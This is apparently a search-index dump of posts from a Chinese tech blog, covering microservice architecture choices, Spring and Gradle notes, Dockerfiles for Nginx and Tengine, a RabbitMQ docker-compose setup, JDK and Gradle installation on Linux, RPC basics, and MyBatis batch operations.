未来的定位并不是要成为一个微服务的全面解决方案，而是专注于 RPC 领域，成为微服务生态体系中的一个重要组件。至于微服务化衍生出的服务治理需求，Dubbo 正在积极适配开源解决方案，并且已经启动独立的开源项目予以支持。因此基于 Dubbo 的微服务解决方案是：Dubbo + Nacos + Sentinel + 其他。 基于 Spring Cloud 的微服务解决方案SpringCloud 的技术选择性是中立的，因此可以随需更换搭配使用，基于 SpringCloud 的微服务落地解决方案大致可以分为以下三种： 服务注册与发现注册中心对比 ZooKeeper 在分布式 / 微服务系统中的角色ZooKeeper 是一种分布式 / 微服务协调服务，用于管理大型主机，包括分布式锁、服务注册与发现。其中 Zookeeper 是为读多写少的场景所设计，并不是用来存储大规模业务数据，而是用于存储少量的状态和配置信息，每个节点的数据最大不能超过 1MB。 统一配置中心Spring Cloud Config 配置中心架构Spring Cloud Config 基于消息总线的架构图如下，该架构需要依赖外部的 MQ 组件，如 Rabbit、Kafka 实现远程环境事件变更通知，客户端实时配置变更可以基于 Git Hook 功能实现。当依赖的消息组件出现问题时，此时如果 Git 仓库 配置发生了变更，会导致部分或所有客户端可能无法获取到最新配置，这样就造成了客户端应用配置数据无法达到最终一致性，进而引起线上问题。架构图中的 Self scheduleing refresher 就是为了解决该问题，它是一个定时任务，执行时会判断本地的 Git 仓库版本与远程 Git 仓库版本是否一致，若不一致则会从配置中心获取最新配置进行加载，保障了配置最终一致性。 路由网关路由网关的性能对比 Spring Cloud Gateway ~ Zuul 2 &lt;&lt; OpenResty ~&lt; Kong &lt;&lt; Direct（直连） Spring Cloud Gateway、Zuul 2 的性能差不多，大概是直连的 35%-40% OpenResty、Kong 差不多，大概是直连的 60%-70% 值得一提的是，在大并发场景下，例如模拟 200 并发用户、1000 并发用户时，Zuul 2 会有很大概率返回出错，这也说明 Zuul 2 目前还不成熟。Kong 的性能非常不错，非常适合做流量网关，并且对于 service、route、upstream、consumer、plugins 的抽象，也是自研网关值得借鉴的。但对于复杂系统，不建议业务网关用 Kong，或者更明确的说是不建议在 Java 技术栈的系统深度定制 Kong 或 OpenResty，主要是工程性方面的考虑。举个例子：假如有很多个不同业务线，鉴权方式五花八门，都是与业务多少有点相关的；这时如果把鉴权在网关实现，就需要维护大量的 Lua 脚本，引入一个新的复杂技术栈是一个成本不低的事情。Spring Cloud Gateway、Zuul2 对于 Java 技术栈来说比较方便，可以依赖业务系统的一些 Common 组件；而使用 Lua 开发不方便，不光是语言的问题，更是复用基础设施的问题。另外，对于网关系统来说，性能不是差一个数量级，问题不是很大，多加机器就可以搞定。 Spring Cloud Gateway 与 Zuul 1.x 对比 底层实现：Zuul 1.x 基于 Servlet 2.5 构建，使用的是阻塞的 I/O 模型。Gateway 是基于 Spring 5.x、Spring Boot 2.x、Spring WebFlux 和 Project Reactor 等技术，底层使用 Netty 的非阻塞 I/O 模型。 长连接：Gateway 支持长连接，而 Zuul 1.x 不支持长连接（如 WebSocket），不适用后端服务响应慢或者高并发场景下，因为线程数量是固定（有限）的，线程容易被耗尽，导致新请求被拒绝处理。 限流：Zuul 1.x 需要通过 Filter 实现限流扩展，Gateway 内置了限流过滤器。 性能：根据官方提供的基准测试，Spring Cloud Gateway 的 RPS（每秒请求数）是 Zuul 1.x 的 1.6 倍，平均延迟是 Zuul 1.x 的一半。 技术栈沉淀：Zuul 1.x 开源近七年，经受考验，稳定成熟，Gateway 未见实际落地案例，Github 统计如下： 仓库数量 issues 数量 说明 Zuul1.x 1007 repositories Zuul1.x 88 Open / 2736 Closed 统计时间截止 2019/8/26 Gateway 102 repositories Gateway 135 Open / 850 Closed 统计时间截止 2019/8/26 杂项分布式锁的实现方案 Redisson：Redis 官方的分布式锁实现 Zookeeper：利用 Zookeeper 的顺序临时节点，来实现分布式锁和等待队列 Chubby：Google 公司实现的粗粒度分布式锁服务，底层利用了 Paxos 一致性算法 Redis：和 Memcached 的方式类似，利用 Redis 的 setnx 命令，此命令同样是原子性操作，只有在 key 不存在的情况下才能 set 成功 Memcached：利用 Memcached 的 add 命令，此命令是原子性操作，只有在 key 不存在的情况下才能 add 成功，也就意味着线程得到了锁 Nginx 动态更新 upstream 的方案在不使用服务发现中间件（如 Zookeeper、Eureka、Consul）的场景下，使用传统的基于代理的负载均衡解决方案（如 Nginx），此时可以考虑使用以下方案动态更新服务提供者列表。 手工或者通过脚本方式，在部署的时候去更新 Nginx 的配置文件，然后 reload 使用 ngx_http_dyups_module 模块，通过 REST API 来在运行时直接更新 upstream 而不需要 reload consul-template + Nginx 的方案一，通过 consul 监听服务实例的变化，然后更新 Nginx 的配置文件，通过 reload 实现服务列表的更新 consul-template + Nginx 的方案二，Nginx 在运行时通过 consul 获取服务列表来实现动态 upstream 的路由 OpenResty + Lua 的方案，通过 Lua 脚本实现动态 upstream 的路由 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 架构"},{title:"Spring 开发随笔",url:"/posts/19b24d.html",text:'@RequestRequestBody 注解抛出异常信息 “Required request body is missing” 采用 SSM 框架，前端将参数传递给后端，SpringMVC 可以通过注解 @RequestBody 将传递参数绑定在 Controller 的方法参数中。此时必须注意，当请求方法声明为 GET 和 DELETE 的时候，HTTP 请求规范里规定是不会有 RequestBody 的，只有请求方法声明为 POST 和 PUT 的时候才有，因此 @RequestBody 不适用于 GET 与 DELETE 方法。还有如果请求方法声明为 GET、DELETE，那么 SpringMVC 可以直接将传递参数绑定在方法的参数中，如果请求方法声明为 POST、PUT，则必须使用注解 @RequestBody 修饰 Controller 中的方法参数，否则无法获取前端传递过来的参数值。正确的使用方法如下： 1234567891011121314151617181920212223242526272829303132333435363738@Controller@RequestMapping("/user/api")public class UserApiController { @Autowired private UserApiService userApiService; @ResponseBody @RequestMapping(value = "/get/{id}", method = RequestMethod.GET) public RequestResult&lt;UserApiVo&gt; getById(@PathVariable("id") int id) { return userApiService.get(id); } @ResponseBody @RequestMapping(value = "/query", method = RequestMethod.GET) public RequestResult&lt;Page&gt; query(Page page) { return userApiService.query(page); } @ResponseBody @RequestMapping(value = "/add", method = RequestMethod.POST) public RequestResult add(@RequestBody @Valid UserApiVo vo) { return userApiService.add(vo); } @ResponseBody @RequestMapping(value = ("/update"), method = RequestMethod.POST) public RequestResult update(@RequestBody @Valid UserApiVo vo) { return userApiService.update(vo); } @ResponseBody @RequestMapping(value = "/delete/{id}", method = RequestMethod.DELETE) public RequestResult delete(@PathVariable("id") int id) { return userApiService.delete(id); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"Gradle 开发随笔",url:"/posts/2148b5a7.html",text:'前言 Gradle Plugin 官网 Gradle 官方英文文档 Gradle W3School 中文教程 Gradle 常见配置指定 JDK 版本在项目的 gradle.properties 配置文件中，添加以下内容： 1org.gradle.java.home=/usr/java/jdk-17/ 添加 Lombok 依赖123456dependencies { compileOnly \'org.projectlombok:lombok:1.18.6\' testCompileOnly \'org.projectlombok:lombok:1.18.6\' annotationProcessor \'org.projectlombok:lombok:1.18.6\' testAnnotationProcessor \'org.projectlombok:lombok:1.18.6\'} Gradle 项目打包项目打成 Jar 包后包含所有依赖123456789jar { manifest { attributes( "Manifest-Version": 1.0, "Main-Class": "com.clay.proxy.ProxyApplication" ) } from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }} Gradle 单元测试编译时取消所有单元测试123test { exclude \'**/*\'} Gradle Plugin 使用plugins 与 apply plugin 的区别 Gradle 新版本的写法 123plugins { id \'org.springframework.boot\' version \'2.1.0.RELEASE\'} Gradle 2.0 及更旧版本的写法 12345678910buildscript { repositories { mavenCentral() } dependencies { classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}") }}apply plugin: \'org.springframework.boot\' Gradle 多模块开发子模块依赖父模块的 Jar 包类在父模块的 build.gradle 配置文件中，添加以下内容： 123jar { enabled = true} 子模块依赖父模块中的资源文件在子模块的 build.gradle 配置文件中，指定父模块的资源文件，配置方式如下： 第一种方式 12345678sourceSets { main { resources { // 指定资源文件目录，若存在同名资源文件，左边声明的默认会被右边声明的所覆盖 srcDirs = [\'src/main/resources\', \'../common/build/resources/main\'] } }} 第二种方式 12345processResources { // 指定资源文件目录，若存在同名资源文件，先声明的默认会被后声明的所覆盖 from(\'src/main/resources\') from(\'../common/build/resources/main\')} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"编程语言分类汇总",url:"/posts/dbbdce78.html",text:'编程四大基础 数据结构与算法 计算机网络 操作系统 设计模式 底层开发 汇编语言 C C++ Rust 后端开发 Java Go Python PHP Ruby Scala Clojure 前端开发 JavaScript TypeScript WebAssembly 数据分析 Python R 语言 网站爬虫 Python 大数据 Java Scala 区块链 Solidity Go Rust Haskell JavaScript TypeScript 人工智能 Python Java C/C++ Lisp Prolog 移动端开发IOS 开发 Objective-C Swift Android 开发 Java Kotlin Groovy 其他领域开发 Julia Perl Lua Shell table { width: fit-content; border-collapse: unset; } th, td { padding-left: 30px; padding-right: 30px; font-weight: normal; border-bottom: 1px solid #ddd; } var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发随笔"},{title:"编写 DockerFile 构建 Nginx 与 Tengine 镜像",url:"/posts/e34a05cd.html",text:'Nginx 镜像的 DockerFile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# 安装软件RUN yum -y update &amp;&amp; yum -y install gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# 创建用户RUN groupadd wwwRUN useradd -g www www -s /bin/false# 定义Nginx版本号ENV VERSION 1.14.2# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://nginx.org/download/nginx-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/nginx-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV NGINX_HOME /usr/local/nginxRUN mkdir -p $NGINX_HOMERUN chown -R www:www $NGINX_HOME# 进入解压目录WORKDIR /usr/local/src/nginx-$VERSION# 编译安装RUN ./configure \\ --user=www \\ --group=www \\ --prefix=$NGINX_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_moduleRUN makeRUN make install# 备份Nginx的配置文件RUN mv $NGINX_HOME/conf/nginx.conf $NGINX_HOME/conf/nginx.conf.default# 设置环境变量ENV PATH $PATH:$NGINX_HOME/sbin# 创建WebApp目录ENV WEB_APP /usr/share/nginx/htmlRUN mkdir -p $WEB_APP# 设置默认工作目录WORKDIR $WEB_APP# 暴露端口EXPOSE 80EXPOSE 443# 清理压缩包与解压文件RUN rm -rf /usr/local/src/nginx*CMD $NGINX_HOME/sbin/nginx -g \'daemon off;\' -c $NGINX_HOME/conf/nginx.conf 构建 Nginx 镜像 12# 构建Nginx镜像# docker build -f docker-file -t peter/nginx:1.14.2 . Docker-Compose 管理 Nginx 镜像 1234567891011121314151617version: "3.5"services: nginx: image: peter/nginx:1.14.2 container_name: nginx-1.14.2 privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/nginx/wwwroot:/usr/share/nginx/html\' - \'/container/nginx/logs:/usr/local/nginx/logs\' - \'/container/nginx/nginx.conf:/usr/local/nginx/conf/nginx.conf\'# 上面的配置是docker-compose.yml文件的内容，数据卷部分可以根据自己的实际情况进行修改# 注意： 在/container/nginx/nginx.conf配置文件中，需要手动修改root的路径为/usr/share/nginx/html 创建并启动 Nginx 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps Tengine 镜像的 DockerFile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# 安装软件RUN yum -y update &amp;&amp; yum -y install vim tree htop tmux net-tools telnet wget curl supervistor autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel# 创建用户RUN groupadd tengineRUN useradd -g tengine tengine# 定义Tengine版本号ENV VERSION 2.2.3# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# 进入解压目录WORKDIR /usr/local/src/tengine-$VERSION# 编译安装RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_moduleRUN makeRUN make install# 备份Tengine的配置文件RUN mv $TENGINE_HOME/conf/nginx.conf $TENGINE_HOME/conf/nginx.conf.default# 设置环境变量ENV PATH $PATH:$TENGINE_HOME/sbin# 创建WebApp目录ENV WEB_APP /usr/share/tengine/htmlRUN mkdir -p $WEB_APP# 设置默认工作目录WORKDIR $WEB_APP# 暴露端口EXPOSE 80EXPOSE 443# 清理压缩包与解压文件RUN rm -rf /usr/local/src/tengine*CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf 构建 Tengine 镜像 12# 构建Tengine镜像# docker build -f docker-file -t peter/tengine:2.2.3 . Docker-Compose 管理 Tengine 镜像 123456789101112131415161718version: "3.5"services: tengine: image: peter/tengine:2.2.3 container_name: tengine:2.2.3 restart: always privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/tengine/wwwroot/:/usr/share/tengine/html\' - \'/container/tengine/logs:/usr/local/tengine/logs\' - \'/container/tengine/nginx.conf:/usr/local/tengine/conf/nginx.conf\'# 上面的配置是docker-compose.yml文件的内容，数据卷部分可以根据自己的实际情况进行修改# 注意： 在/container/tengine/nginx.conf配置文件中需要手动修改root的路径为/usr/share/tengine/html 创建并启动 Tengine 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 web服务器"},{title:"Docker 安装 RabbitMQ",url:"/posts/c6982fb6.html",text:'Docker-Compose 单机安装 RabbitMQ RabbitMQ 的数据库名称规则是 NODENAME@hostname，由于 Docker 每次从 Docker Image 启动容器的时候会自动生成 hostname，这样一来之前保存在主机上的数据库就会没用了，包括之前创建的用户也会没有了。所以在创建容器的时候必须指定 --hostname=rabbitmq，这样 Docker 环境启动后 RabbitMQ 就会一直读取固定目录中的数据了。docker-compose.yml 的文件内容如下，其中 RABBITMQ_DEFAULT_USER 为用户名，RABBITMQ_DEFAULT_PASS 为用户密码，5672 为 RabbitMQ 的服务端口，15672 为 RabbitMQ 的 Web 控制台的端口。RabbitMQ 的 Web 控制台默认是未启用的，若需启用 Web 控制台的功能，可以挂载对应的配置文件到容器内的 /etc/rabbitmq/enabled_plugins，而配置文件的内容为 RabbitMQ 启用的插件列表。 123456789101112131415161718192021222324rabbitmq: image: rabbitmq:3.8.14 container_name: rabbitmq-3.8.14 hostname: rabbitmq privileged: false networks: rabbitmq-network: ipv4_address: 172.175.0.5 environment: - RABBITMQ_DEFAULT_USER=admin - RABBITMQ_DEFAULT_PASS=admin ports: - 5672:5672 - 15672:15672 volumes: - \'/container/mahattan/rabbitmq/enabled_plugins:/etc/rabbitmq/enabled_plugins\'networks: rabbitmq-network: name: rabbitmq-network driver: bridge ipam: config: - subnet: 172.175.0.0/24 上述挂载的 /container/mahattan/rabbitmq/enabled_plugins 的配置文件内容如下： 1[rabbitmq_federation_management,rabbitmq_management,rabbitmq_mqtt,rabbitmq_stomp]. RabbitMQ 镜像与容器管理命令： 1234567891011# 创建并启动RabbitMQ容器# docker-compose up -d# 查看RabbitMQ的运行状态# docker-compose ps# 查看RabbitMQ的运行日志# docker logs rabbitmq-3.8.14# 浏览器访问RabbitMQ的管理界面，访问地址如下http://127.0.0.1:15672 参考资料 Docker 官方安装 RabbitMQ 的教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Linux 安装 Gradle",url:"/posts/7b495a3f.html",text:'前言本文适用于 CentOS/Debian/Ubuntu 等 Linux 发行版系统。 JDK 安装由于 Gradle 的运行依赖于 JDK，但是安装 Oracle JDK 不是必需的，如果不想安装可以使用 Open-JDK 替代，而且大多数 Linux 发行版自带 Open-JDK。 1234567891011121314151617181920212223242526272829303132# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 删除下载文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 如果已安装Open-JDK，则覆盖Java命令的软链接# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK的环境变量，在配置文件末尾追加以下内容即可# vim /etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 1.8.0_201# java -versionjava version "1.8.0_201"Java(TM) SE Runtime Environment (build 1.8.0_201-b09)Java HotSpot(TM) 64-Bit Server VM (build 25.201-b09, mixed mode) Gradle 下载 Gradle 官方二进制包（ binary-only ） Gradle 安装1234567891011121314151617# 下载gradle# wget https://downloads.gradle.org/distributions/gradle-5.4.1-bin.zip# 解压gradle# unzip -d /usr/local gradle-5.4.1-bin.zip# 配置环境变量，编辑/etc/profile文件在末尾添加以下配置内容# vim /etc/profileGRADLE_HOME=/usr/local/gradle-5.4.1PATH=$PATH:$GRADLE_HOME/binexport GRADLE_HOME PATH# 使环境变量生效# source /etc/profile# 查看Gradle是否配置成功# gradle -v var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux 运维知识图谱 (最新)",url:"/posts/56039a80.html",text:'Linux 运维技术 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"知识图谱"},{title:"浅析 RPC 远程过程调用基本原理",url:"/posts/37f9ab5d.html",text:'RPC 框架的核心 RPC 的核心模块： 通讯、序列化 主流的 RPC 框架： Dubbo、gRPC、Thrift、HSF、Motan、ZBUS RPC 的基本调用原理 一次完整的 RPC 调用流程（同步调用，异步另说）如下：1）服务消费方（client）调用以本地调用方式调用服务；2）client stub 接收到调用后负责将方法、参数等组装成能够进行网络传输的消息体；3）client stub 找到服务地址，并将消息发送到服务端；4）server stub 收到消息后进行解码；5）server stub 根据解码结果调用本地的服务；6）本地服务执行并将结果返回给 server stub；7）server stub 将返回结果打包成消息并发送至消费方；8）client stub 接收到消息，并进行解码；9）服务消费方得到最终结果。RPC 框架的目标就是要 2~8 这些步骤都封装起来，这些细节对用户来说是透明的，不可见的。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"MyBatis 入门教程之八",url:"/posts/9ed8a349.html",text:'大纲 MyBatis 入门教程之一 MyBatis 入门教程之二 MyBatis 入门教程之三 MyBatis 入门教程之四 MyBatis 入门教程之五 MyBatis 入门教程之六 MyBatis 入门教程之七 MyBatis 入门教程之八 MyBatis 实用场景MyBatis 批量操作调用不带参数的 openSession() 方法时，创建的 SqlSession 对象具有如下特性： 会开启一个事务（不会自动提交） 数据库连接对象会从由环境配置的数据源实例得到 事务隔离级别将会使用驱动或数据源的默认配置 预处理语句不会被复用，也不会批量处理更新 值得一提的是，openSession() 方法的 ExecutorType 类型的参数是枚举类型，取值如下： SIMPLE：这个执行器类型不做特殊的事情（默认执行器），它会为每个 SQL 语句的执行创建一个新的预处理语句。 REUSE：这个执行器类型会复用预处理语句。 BATCH：这个执行器会批量执行所有更新语句。 批量操作介绍批量操作就是使用 MyBatis 提供的 BATCH 类型的 Executor 进行的，它的底层是通过 JDBC 暂存 SQL 语句的方式来实现，也就是保存 SQL 语句到一定数量后再发给数据库执行一次。MyBatis 与 Spring 整合时，推荐额外配置一个可以专门用来执行批量操作的 SqlSession，配置示例如下。当需要使用批量操作的时候，可以在 Service 层注入可批量操作的 SqlSession，然后通过它获取 Mapper 映射器来操作数据库。 1234&lt;bean id="sqlSession" class="org.mybatis.spring.SqlSessionTemplate"&gt; &lt;constructor-arg name="executorType" value="BATCH" /&gt; &lt;constructor-arg name="sqlSessionFactory" ref="sqlSessionFactoryBean" /&gt;&lt;/bean&gt; 特别注意 当 ExecutorType 指定为 BATCH 后，执行增删改操作不会再返回正确的受影响的记录数。 批量操作是在 session.commit() 执行以后才发送 SQL 语句给数据库执行的。若想让其提前执行，以方便后续的查询操作可以获取到数据，则可以调用 sqlSession.flushStatements() 方法，让其直接冲刷到数据库进行执行。 批量操作使用案例本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-lesson-22。 Mapper 接口 12345public interface EmployeeMapper { public boolean addEmp(Employee employee);} SQL 映射文件 12345678&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;insert id="addEmp" parameterType="com.clay.mybatis.bean.Employee"&gt; insert into t_employee (last_name, gender, email) values(#{lastName}, #{gender}, #{email}) &lt;/insert&gt;&lt;/mapper&gt; 批量操作 1234567891011121314151617181920212223242526public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); // 批量操作：设置执行器的类型为 BATCH SqlSession session = sqlSessionFactory.openSession(ExecutorType.BATCH); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); for (int i = 0; i &lt; 10; i++) { Employee employee = new Employee("employe-" + i, "1", "employe@gmail.com"); mapper.addEmp(employee); } session.commit(); } finally { if (session != null) { session.close(); } } }} 执行结果 12345678910111213141516171821:25:28,897 DEBUG JdbcTransaction:137 - Opening JDBC Connection21:25:29,120 DEBUG PooledDataSource:434 - Created connection 706895319.21:25:29,120 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@2a225dd7]21:25:29,124 DEBUG addEmp:137 - ==&gt; Preparing: insert into t_employee (last_name, gender, email) values(?, ?, ?)21:25:29,165 DEBUG addEmp:137 - ==&gt; Parameters: employe-0(String), 1(String), employe@gmail(String)21:25:29,166 DEBUG addEmp:137 - ==&gt; Parameters: employe-1(String), 1(String), employe@gmail(String)21:25:29,166 DEBUG addEmp:137 - ==&gt; Parameters: employe-2(String), 1(String), employe@gmail(String)21:25:29,167 DEBUG addEmp:137 - ==&gt; Parameters: employe-3(String), 1(String), employe@gmail(String)21:25:29,167 DEBUG addEmp:137 - ==&gt; Parameters: employe-4(String), 1(String), employe@gmail(String)21:25:29,168 DEBUG addEmp:137 - ==&gt; Parameters: employe-5(String), 1(String), employe@gmail(String)21:25:29,168 DEBUG addEmp:137 - ==&gt; Parameters: employe-6(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-7(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-8(String), 1(String), employe@gmail(String)21:25:29,170 DEBUG addEmp:137 - ==&gt; Parameters: employe-9(String), 1(String), employe@gmail(String)21:25:29,174 DEBUG JdbcTransaction:70 - Committing JDBC Connection 